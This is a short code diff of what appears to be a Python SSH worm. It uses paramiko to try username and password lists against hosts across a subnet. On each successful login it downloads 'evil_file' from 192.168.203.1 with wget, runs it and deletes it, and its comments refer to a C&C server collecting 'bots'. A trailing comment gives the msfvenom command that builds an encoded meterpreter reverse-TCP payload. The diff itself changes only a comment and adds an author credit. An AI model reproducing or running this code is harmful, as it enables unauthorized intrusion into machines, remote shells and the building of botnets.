@@ -19,7 +19,7 @@ def ssh_start():
     p.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
         p.connect(ip, username=user_list[num], password=pass_list[num2])
-		# receive one shell from each target per process. 
+		# one target per process. 
         stdin, stdout, stderr = p.exec_command('wget "192.168.203.1/evil_file"; chmod 755 evil_file; ./evil_file; sleep 1; rm evil_file')
         # print then append target's output into file 'bots' on C&C.
         # stdin, stdout, stderr = p.exec_command('uname -a; id')
@@ -48,3 +48,5 @@ for i in range(1,255):
         num += 1
 
 # msfvenom --payload linux/x86/meterpreter_reverse_tcp LPORT=443 LHOST=192.168.203.1 -e shikata_ga_nai -f elf -a x86 -o evil_file
+
+# By Freshnuts
